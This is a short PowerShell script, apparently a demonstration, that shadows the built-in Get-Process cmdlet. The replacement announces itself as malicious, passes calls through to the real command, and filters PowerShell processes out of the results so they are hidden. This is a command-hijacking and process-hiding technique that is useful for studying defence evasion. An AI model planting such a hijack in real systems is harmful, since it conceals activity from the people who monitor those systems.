$Function = Get-Command Get-Process

function Get-Process {
	param(
		$Name,
		$Id,
		$InputObject,
		$IncludeUserName,
		$ComputerName,
		$Module,
		$FileVersionInfo
	)
	Write-Host -ForegroundColor "Red" -Object "Hello from malicious Get-Process!"
	& $Function @PSBoundParameters | Where-Object {$_.ProcessName -notmatch 'powershell'}
}
